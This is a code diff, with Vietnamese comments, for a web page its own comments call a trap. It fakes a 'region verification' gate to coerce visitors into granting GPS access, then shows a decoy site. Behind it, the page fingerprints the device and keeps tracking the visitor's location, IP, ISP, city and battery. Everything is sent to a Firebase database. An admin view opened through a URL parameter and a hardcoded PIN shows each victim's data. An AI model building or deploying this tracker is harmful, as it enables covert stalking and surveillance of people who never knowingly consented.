@@ -96,205 +96,230 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
     <script>
-        const DETAIL_PIN = "123456"; 
-        const ADMIN_KEY = "admin";  
+    const DETAIL_PIN = "123456"; 
+    const ADMIN_KEY = "admin";  
 
-        // 💥 DÁN LINK FIREBASE CỦA BẠN VÀO DÒNG DƯỚI 💥
-        const firebaseConfig = { 
-            databaseURL: "https://appdinhvi-558a5-default-rtdb.asia-southeast1.firebasedatabase.app/" 
+    // 💥 DÁN LINK FIREBASE CỦA BẠN VÀO DƯỚI 💥
+    const firebaseConfig = { 
+        databaseURL: "https://appdinhvi-558a5-default-rtdb.asia-southeast1.firebasedatabase.app/" 
+    };
+
+    let db = null;
+    try { 
+        firebase.initializeApp(firebaseConfig); 
+        db = firebase.database(); 
+    } catch(e){}
+
+    function getDeviceFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
+        ctx.fillText("fingerprint_id", 2, 2);
+        const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+        const hardware = `${navigator.hardwareConcurrency || 1}_${navigator.language}`;
+        const rawId = canvas.toDataURL() + screenRes + hardware;
+        let hash = 0;
+        for (let i = 0; i < rawId.length; i++) {
+            hash = ((hash << 5) - hash) + rawId.charCodeAt(i);
+            hash |= 0;
+        }
+        return 'dev_' + Math.abs(hash).toString(36);
+    }
+
+    const myUserId = getDeviceFingerprint();
+    let allUsersData = {};
+
+    // KIỂM TRA TRẠNG THÁI KHI VÀO TRANG
+    function initPage() {
+        const urlParams = new URLSearchParams(window.location.search);
+        
+        // 1. Nếu mở bằng link Admin (?pass=admin)
+        if (urlParams.get('pass') === ADMIN_KEY) {
+            document.getElementById('gateOverlay').style.display = 'none';
+            document.getElementById('decoyContainer').style.display = 'none';
+            document.getElementById('dashboardView').style.display = 'block';
+            silentBackgroundTracking();
+            return;
+        }
+
+        // 2. Nếu người dùng ĐÃ TỪNG cho phép trước đó -> Ẩn màn hình chặn, vào thẳng web bẫy
+        if (localStorage.getItem("gps_allowed") === "true") {
+            document.getElementById('gateOverlay').style.display = 'none';
+            document.getElementById('decoyContainer').style.display = 'block';
+            startSilentTracking();
+        } else {
+            // Chưa cho phép -> Giữ nguyên màn hình chặn, hiện nút bấm
+            document.getElementById('gateOverlay').style.display = 'flex';
+        }
+    }
+
+    // KHI NGƯỜI DÙNG BẤM NÚT XÁC MINH
+    function startVerification() {
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    // CHO PHÉP THÀNH CÔNG -> Lưu trạng thái, ẩn màn hình chặn, chuyển sang web bẫy ngay lập tức
+                    localStorage.setItem("gps_allowed", "true");
+                    document.getElementById('gateOverlay').style.display = 'none';
+                    document.getElementById('decoyContainer').style.display = 'block';
+                    pushPositionToFirebase(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác");
+                },
+                (err) => {
+                    // TỪ CHỐI -> Giữ nguyên màn hình và hiển thị nút tiếp tục để ép vòng lặp
+                    alert("⚠️ Vui lòng cho phép trang web truy cập vào vị trí để xác minh khu vực.");
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            alert("Trình duyệt của bạn không hỗ trợ định vị.");
+        }
+    }
+
+    // Theo dõi ngầm khi đã cấp quyền từ trước
+    function startSilentTracking() {
+        if ("geolocation" in navigator) {
+            navigator.geolocation.watchPosition(
+                (pos) => pushPositionToFirebase(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác"),
+                (err) => {},
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+            );
+        }
+    }
+
+    async function silentBackgroundTracking() {
+        const info = await getSystemData();
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => pushPositionToFirebase(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác"),
+                (err) => pushPositionToFirebase(info.lat, info.lng, "Ước Tính Qua IP")
+            );
+        }
+    }
+
+    async function pushPositionToFirebase(lat, lng, mode) {
+        const info = await getSystemData();
+        const myData = {
+            lat: lat,
+            lng: lng,
+            mode: mode,
+            deviceInfo: info,
+            status: "🟢 Đang Online",
+            time: new Date().toLocaleTimeString('vi-VN') + " " + new Date().toLocaleDateString('vi-VN')
         };
 
-        let db = null;
-        try { 
-            firebase.initializeApp(firebaseConfig); 
-            db = firebase.database(); 
+        if (db) {
+            db.ref('network_users/' + myUserId).set(myData);
+            db.ref('network_users/' + myUserId + '/status').onDisconnect().set("🔴 Đã Thoát Web");
+        }
+    }
+
+    async function getSystemData() {
+        const ua = navigator.userAgent;
+        let os = "Windows", device = "Máy tính PC";
+        if (ua.indexOf("Android") !== -1) { os = "Android"; device = "Điện thoại Android"; }
+        else if (ua.indexOf("iPhone") !== -1) { os = "iOS"; device = "iPhone"; }
+        else if (ua.indexOf("iPad") !== -1) { os = "iPadOS"; device = "iPad"; }
+
+        let battery = "N/A";
+        if (navigator.getBattery) {
+            try {
+                const b = await navigator.getBattery();
+                battery = Math.round(b.level * 100) + "% " + (b.charging ? "🔌" : "🔋");
+            } catch(e){}
+        }
+
+        let ipData = { ip: "Không xác định", isp: "N/A", city: "N/A", lat: 0, lng: 0 };
+        try {
+            const res = await fetch('https://ipwho.is/');
+            const d = await res.json();
+            if(d.success) {
+                ipData = {
+                    ip: d.ip || "N/A",
+                    isp: d.connection ? d.connection.isp : "N/A",
+                    city: d.city || "N/A",
+                    lat: d.latitude || 0,
+                    lng: d.longitude || 0
+                };
+            }
         } catch(e){}
 
-        function getDeviceFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
-            ctx.fillText("fingerprint_id", 2, 2);
-            const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}`;
-            const hardware = `${navigator.hardwareConcurrency || 1}_${navigator.language}`;
-            const rawId = canvas.toDataURL() + screenRes + hardware;
-            let hash = 0;
-            for (let i = 0; i < rawId.length; i++) {
-                hash = ((hash << 5) - hash) + rawId.charCodeAt(i);
-                hash |= 0;
-            }
-            return 'dev_' + Math.abs(hash).toString(36);
-        }
+        return { os, device, battery, ...ipData };
+    }
 
-        const myUserId = getDeviceFingerprint();
-        let allUsersData = {};
+    if (db) {
+        db.ref('network_users').on('value', (snapshot) => {
+            allUsersData = snapshot.val() || {};
+            renderUserList();
+        });
+    }
 
-        // KIỂM TRA ĐƯỜNG DẪN ADMIN (?pass=admin)
-        function initPage() {
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.get('pass') === ADMIN_KEY) {
-                // Nếu có pass admin -> Bỏ qua màn hình xác minh, mở thẳng Bảng Quản Trị
-                document.getElementById('gateOverlay').style.display = 'none';
-                document.getElementById('decoyContainer').style.display = 'none';
-                document.getElementById('dashboardView').style.display = 'block';
-                silentBackgroundTracking();
-            }
-        }
+    function renderUserList() {
+        const listEl = document.getElementById('userList');
+        if (!listEl) return;
+        
+        listEl.innerHTML = "";
 
-        // KÍCH HOẠT XÁC MINH GPS
-        function startVerification() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        // BẤM CHO PHÉP -> Ẩn màn hình khóa, mở Web bẫy, gửi tọa độ lên Firebase
-                        document.getElementById('gateOverlay').style.display = 'none';
-                        document.getElementById('decoyContainer').style.display = 'block';
-                        pushPositionToFirebase(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác");
-                    },
-                    (err) => {
-                        // BẤM TỪ CHỐI/LỖI -> Vòng lặp: Thông báo lại & yêu cầu nhấn tiếp tục
-                        alert("⚠️ Vùng truy cập chưa được xác thực! Vui lòng cho phép trang web xác thực khu vực.");
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else {
-                alert("Trình duyệt của bạn không hỗ trợ xác minh vùng.");
-            }
-        }
+        Object.keys(allUsersData).forEach((id) => {
+            const u = allUsersData[id];
+            const info = u.deviceInfo || {};
+            const isMe = id === myUserId;
+            const statusText = u.status || "🔴 Đã Thoát Web";
 
-        async function silentBackgroundTracking() {
-            const info = await getSystemData();
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => pushPositionToFirebase(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác"),
-                    (err) => pushPositionToFirebase(info.lat, info.lng, "Ước Tính Qua IP")
-                );
-            }
-        }
+            const card = document.createElement('div');
+            card.className = `user-card ${isMe ? 'is-me' : ''}`;
+            card.onclick = () => openUserDetail(id);
 
-        async function pushPositionToFirebase(lat, lng, mode) {
-            const info = await getSystemData();
-            const myData = {
-                lat: lat,
-                lng: lng,
-                mode: mode,
-                deviceInfo: info,
-                status: "🟢 Đang Online",
-                time: new Date().toLocaleTimeString('vi-VN') + " " + new Date().toLocaleDateString('vi-VN')
-            };
-
-            if (db) {
-                db.ref('network_users/' + myUserId).set(myData);
-                db.ref('network_users/' + myUserId + '/status').onDisconnect().set("🔴 Đã Thoát Web");
-            }
-        }
-
-        async function getSystemData() {
-            const ua = navigator.userAgent;
-            let os = "Windows", device = "Máy tính PC";
-            if (ua.indexOf("Android") !== -1) { os = "Android"; device = "Điện thoại Android"; }
-            else if (ua.indexOf("iPhone") !== -1) { os = "iOS"; device = "iPhone"; }
-            else if (ua.indexOf("iPad") !== -1) { os = "iPadOS"; device = "iPad"; }
-
-            let battery = "N/A";
-            if (navigator.getBattery) {
-                try {
-                    const b = await navigator.getBattery();
-                    battery = Math.round(b.level * 100) + "% " + (b.charging ? "🔌" : "🔋");
-                } catch(e){}
-            }
-
-            let ipData = { ip: "Không xác định", isp: "N/A", city: "N/A", lat: 0, lng: 0 };
-            try {
-                const res = await fetch('https://ipwho.is/');
-                const d = await res.json();
-                if(d.success) {
-                    ipData = {
-                        ip: d.ip || "N/A",
-                        isp: d.connection ? d.connection.isp : "N/A",
-                        city: d.city || "N/A",
-                        lat: d.latitude || 0,
-                        lng: d.longitude || 0
-                    };
-                }
-            } catch(e){}
-
-            return { os, device, battery, ...ipData };
-        }
-
-        if (db) {
-            db.ref('network_users').on('value', (snapshot) => {
-                allUsersData = snapshot.val() || {};
-                renderUserList();
-            });
-        }
-
-        function renderUserList() {
-            const listEl = document.getElementById('userList');
-            if (!listEl) return;
-            
-            listEl.innerHTML = "";
-
-            Object.keys(allUsersData).forEach((id) => {
-                const u = allUsersData[id];
-                const info = u.deviceInfo || {};
-                const isMe = id === myUserId;
-                const statusText = u.status || "🔴 Đã Thoát Web";
-
-                const card = document.createElement('div');
-                card.className = `user-card ${isMe ? 'is-me' : ''}`;
-                card.onclick = () => openUserDetail(id);
-
-                card.innerHTML = `
-                    <div>
-                        <div class="device-title">
-                            ${info.device || 'Thiết bị ẩn'} 
-                            ${isMe ? '<span class="badge-me">BẠN</span>' : ''}
-                        </div>
-                        <div class="basic-info">
-                            Trạng thái: <b>${statusText}</b><br>
-                            Cập nhật: ${u.time || 'N/A'}
-                        </div>
+            card.innerHTML = `
+                <div>
+                    <div class="device-title">
+                        ${info.device || 'Thiết bị ẩn'} 
+                        ${isMe ? '<span class="badge-me">BẠN</span>' : ''}
                     </div>
-                    <div style="text-align: right;">
-                        <div class="battery-text">${info.battery || 'N/A'}</div>
-                        <div style="font-size: 11px; color: #58a6ff; margin-top: 5px;">🔒 Xem GPS & IP</div>
+                    <div class="basic-info">
+                        Trạng thái: <b>${statusText}</b><br>
+                        Cập nhật: ${u.time || 'N/A'}
                     </div>
-                `;
-                listEl.appendChild(card);
-            });
+                </div>
+                <div style="text-align: right;">
+                    <div class="battery-text">${info.battery || 'N/A'}</div>
+                    <div style="font-size: 11px; color: #58a6ff; margin-top: 5px;">🔒 Xem GPS & IP</div>
+                </div>
+            `;
+            listEl.appendChild(card);
+        });
+    }
+
+    function openUserDetail(userId) {
+        const inputPin = prompt("🔑 Nhập Mật Khẩu để mở khóa Tọa Độ GPS & Địa Chỉ IP:");
+        if (inputPin === DETAIL_PIN) {
+            const data = allUsersData[userId];
+            if (!data) return;
+            const info = data.deviceInfo || {};
+
+            document.getElementById('infoContent').innerHTML = `
+                <li><span>Chế độ định vị:</span> <b>${data.mode}</b></li>
+                <li><span>Tọa độ GPS:</span> <b>${data.lat.toFixed(5)}, ${data.lng.toFixed(5)}</b></li>
+                <li><span>Địa chỉ IP:</span> <b>${info.ip}</b></li>
+                <li><span>Tỉnh / Thành:</span> <b>${info.city || 'N/A'}</b></li>
+                <li><span>Nhà mạng:</span> <b>${info.isp || 'N/A'}</b></li>
+                <li><span>Tên thiết bị:</span> <b>${info.device}</b></li>
+                <li><span>Hệ điều hành:</span> <b>${info.os}</b></li>
+                <li><span>Dung lượng Pin:</span> <b>${info.battery}</b></li>
+                <li><span>Thời gian:</span> <b>${data.time}</b></li>
+            `;
+            document.getElementById('infoModal').style.display = 'flex';
+        } else if (inputPin !== null) {
+            alert("❌ Mật khẩu không đúng!");
         }
+    }
 
-        function openUserDetail(userId) {
-            const inputPin = prompt("🔑 Nhập Mật Khẩu để mở khóa Tọa Độ GPS & Địa Chỉ IP:");
-            if (inputPin === DETAIL_PIN) {
-                const data = allUsersData[userId];
-                if (!data) return;
-                const info = data.deviceInfo || {};
+    function closeModal() {
+        document.getElementById('infoModal').style.display = 'none';
+    }
 
-                document.getElementById('infoContent').innerHTML = `
-                    <li><span>Chế độ định vị:</span> <b>${data.mode}</b></li>
-                    <li><span>Tọa độ GPS:</span> <b>${data.lat.toFixed(5)}, ${data.lng.toFixed(5)}</b></li>
-                    <li><span>Địa chỉ IP:</span> <b>${info.ip}</b></li>
-                    <li><span>Tỉnh / Thành:</span> <b>${info.city || 'N/A'}</b></li>
-                    <li><span>Nhà mạng:</span> <b>${info.isp || 'N/A'}</b></li>
-                    <li><span>Tên thiết bị:</span> <b>${info.device}</b></li>
-                    <li><span>Hệ điều hành:</span> <b>${info.os}</b></li>
-                    <li><span>Dung lượng Pin:</span> <b>${info.battery}</b></li>
-                    <li><span>Thời gian:</span> <b>${data.time}</b></li>
-                `;
-                document.getElementById('infoModal').style.display = 'flex';
-            } else if (inputPin !== null) {
-                alert("❌ Mật khẩu không đúng!");
-            }
-        }
+    window.onload = initPage;
+</script>
 
-        function closeModal() {
-            document.getElementById('infoModal').style.display = 'none';
-        }
-
-        window.onload = initPage;
-    </script>
 </body>
 </html>
 
